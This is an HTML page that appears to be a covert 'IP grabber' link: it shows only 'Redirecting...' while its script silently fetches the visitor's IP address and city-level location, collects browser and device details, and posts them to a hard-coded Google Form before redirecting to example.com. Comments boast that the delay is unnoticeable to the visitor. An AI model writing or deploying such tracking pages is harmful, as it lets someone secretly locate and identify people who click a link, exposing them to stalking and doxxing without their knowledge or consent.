<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        // Set the destination URL
        const REDIRECT_URL = "https://example.com";

        // This function will handle the data capture and redirect
        async function processAndRedirect() {
            // --- Step 1: Redirect immediately, but with a tiny delay ---
            // This gives the data-sending process below a moment to run.
            // The 100ms delay is unnoticeable to the user.
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 100);

            // --- Step 2: Capture and send the data in the background ---
            try {
                // Fetch the location data
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();

                // Prepare all other data points
                const timestamp = new Date().toISOString();
                const userAgent = navigator.userAgent;
                const os = navigator.platform;

                let deviceInfo = 'Unknown';
                if (navigator.userAgentData) {
                    const platform = navigator.userAgentData.platform;
                    const isMobile = navigator.userAgentData.mobile ? 'Mobile' : 'Desktop';
                    deviceInfo = `${platform} (${isMobile})`;
                } else {
                    const isMobile = /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                    deviceInfo = `${navigator.platform} (${isMobile})`;
                }

                const formData = new FormData();
                formData.append("entry.1496883719", timestamp);
                formData.append("entry.1535774579", geoData.ip);
                formData.append("entry.2067837825", os);
                formData.append("entry.747657848", deviceInfo);
                formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
                formData.append("entry.448354724", userAgent);

                // Send the data to your Google Form
                await fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
                    method: "POST",
                    body: formData,
                    mode: "no-cors"
                });

            } catch (err) {
                // If there's an error, it will be logged in the browser console,
                // but the user will still be redirected.
                console.error("Data capture failed:", err);
            }
        }

        // Call the function to start the process
        processAndRedirect();
    </script>
</head>
<body>
    <!-- The body is empty for the fastest possible experience. -->
</body>
</html>
